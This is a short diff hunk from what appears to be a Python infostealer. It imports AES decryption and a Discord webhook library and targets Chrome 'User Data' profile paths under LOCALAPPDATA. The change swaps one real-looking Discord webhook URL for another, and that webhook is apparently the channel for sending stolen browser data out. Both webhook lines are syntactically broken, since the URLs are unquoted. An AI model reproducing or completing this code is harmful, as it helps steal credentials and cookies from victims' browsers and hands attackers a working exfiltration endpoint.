@@ -8,7 +8,7 @@ from base64 import b64decode
 from Crypto.Cipher import AES
 from shutil import copy2
 from discord_webhook import *
-webhook = "WEBHOOK_URL" https://discord.com/api/webhooks/1038066273017397359/vN6u4qtXg0DNHPaK8mDUuxRgfUcTeyj6X5uhBWLl-TmKmTtnaX2_Zl2vgr7jwx9GdZxi
+webhook = https://discord.com/api/webhooks/1039537198023852122/w-RJsMhzncObcM2mMz5vgl87LBYXOFq_E48x6FFETBv-zDryvAfwYA923Uyb685IOTc3
 local = os.getenv("LOCALAPPDATA") 
 google_paths = [
             local + '\\Google\\Chrome\\User Data\\Default',
